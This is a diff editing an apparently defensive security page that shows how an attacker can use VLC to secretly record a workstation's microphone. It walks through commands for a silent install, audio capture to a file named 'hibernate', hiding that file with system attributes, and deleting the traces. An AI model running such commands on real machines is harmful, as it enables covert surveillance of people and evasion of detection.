@@ -11,16 +11,16 @@ Malicious Process
 
 The following commands demonstrate how an attacker can use VLC Media Player to record audio from a workstation's microphone and hide the recorded file:
 
-1.  `C:\\vlcsetup.exe /S & ping 0.0.0.0 -n 40 >/nul & del /F /Q "%systemdrive%\\Users\\Public\\Desktop\\VLC media player\*\*" & del C:\\vlcsetup.exe`
-This command installs VLC Media Player silently, waits for 40 seconds, and then deletes the installer and any desktop shortcuts created.
+1.  `C:\vlcsetup.exe /S & ping 0.0.0.0 -n 40 >/nul & del /F /Q "%systemdrive%\Users\Public\Desktop\VLC media player\*\*" & del C:\vlcsetup.exe`
+- This command installs VLC Media Player silently, waits for 40 seconds, and then deletes the installer and any desktop shortcuts created.
     
-2.  C:\\Progra~1\\VideoLAN\\VLC\\vlc.exe --one-instance dshow:// :dshow-vdev=none :dshow-adev :sout=#transcode{vcodec=h264,scale=Auto,acodec=mpga,ab=128,channels=2,samplerate=44100}:duplicate{dst=std{access=file,mux="ogg",dst="C:\\hibernate"}}This command starts VLC in a single instance mode, captures audio from the default audio device, and saves the recording to a file named **hibernate** in the root of the C drive.
+2.  C:\Progra~1\VideoLAN\VLC\vlc.exe --one-instance dshow:// :dshow-vdev=none :dshow-adev :sout=#transcode{vcodec=h264,scale=Auto,acodec=mpga,ab=128,channels=2,samplerate=44100}:duplicate{dst=std{access=file,mux="ogg",dst="C:\hibernate"}}This command starts VLC in a single instance mode, captures audio from the default audio device, and saves the recording to a file named **hibernate** in the root of the C drive.
     
-3.  attrib +h +s C:\\hibernateThis command sets the **hibernate** file as hidden and system, making it less likely to be noticed by the user.
+3.  attrib +h +s C:\hibernateThis command sets the **hibernate** file as hidden and system, making it less likely to be noticed by the user.
     
-4.  taskkill /f /im vlc\* & ping 0.0.0.0 -n 5 >/nul & attrib -h -s C:\\hibernateThis command forcefully terminates any VLC processes, waits for 5 seconds, and then removes the hidden and system attributes from the **hibernate** file.
+4.  taskkill /f /im vlc\* & ping 0.0.0.0 -n 5 >/nul & attrib -h -s C:\hibernateThis command forcefully terminates any VLC processes, waits for 5 seconds, and then removes the hidden and system attributes from the **hibernate** file.
     
-5.  del C:\\hibernate & taskkill /f /im cmd\*This command deletes the **hibernate** file and forcefully terminates any Command Prompt processes.
+5.  del C:\hibernate & taskkill /f /im cmd\*This command deletes the **hibernate** file and forcefully terminates any Command Prompt processes.
     
 
 Prevention Measures
